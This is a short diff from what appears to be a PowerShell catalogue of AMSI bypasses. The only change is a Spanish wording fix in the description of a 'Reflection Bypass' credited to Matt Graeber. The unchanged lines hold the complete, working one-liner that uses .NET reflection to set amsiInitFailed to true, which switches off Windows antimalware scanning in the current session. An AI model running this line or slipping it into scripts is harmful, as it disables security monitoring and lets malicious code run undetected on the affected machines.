@@ -11,7 +11,7 @@ function Invoke-Reflection{
 
     $Bypass = New-Object -TypeName PSObject
     $Name = "Reflection Bypass"
-    $Description = "Este bypass fue publicado por Matt Graebers en twitter en 2016. Consiste en usar la reflexión de .NET para cambiar el valor 4ms1InitFail a true, lo que haría que AMSI no se cargue correctamente en la sesión de powershell activa"
+    $Description = "Este bypass fue publicado por Matt Graebers en twitter en 2016. Consiste en usar la reflexión de .NET para cambiar el valor 4ms1InitFail a true, lo que hace que AMSI no se cargue correctamente en la sesión de powershell activa"
     $Script = {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}
 
     $Bypass | Add-Member -MemberType NoteProperty -Name "Name" -Value $Name
